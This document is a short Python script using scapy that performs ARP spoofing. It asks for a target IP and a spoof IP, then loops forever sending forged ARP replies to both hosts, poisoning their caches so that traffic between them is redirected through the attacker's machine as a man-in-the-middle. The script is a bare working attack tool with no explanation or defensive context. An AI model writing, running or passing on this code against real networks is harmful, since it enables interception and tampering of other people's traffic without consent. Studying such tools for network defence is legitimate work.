#!/usr/bin/env python3
from scapy.all import *

def getTargetMAC(ip):

    arpRequest = ARP(pdst = ip)
    broadcast = Ether(dst = 'ff:ff:ff:ff:ff:ff')
    finalPacket = broadcast / arpRequest
    answer = srp(finalPacket, timeout = 2, verbose = False)[0]
    return answer[0][1].hwsrc

def spoofArp(target, spoof):

    mac = getTargetMAC(target)
    packet = ARP(op = 2, hwdst = mac, pdst = target, psrc = spoof)
    send(packet, verbose = False)

def main():

    target = input('Enter a target IP: ')
    spoof = input('Enter in the spoof IP: ')

    try:
        while True:

            spoofArp(target, spoof)
            spoofArp(spoof, target)

    except KeyboardInterrupt:
        exit(0)

main()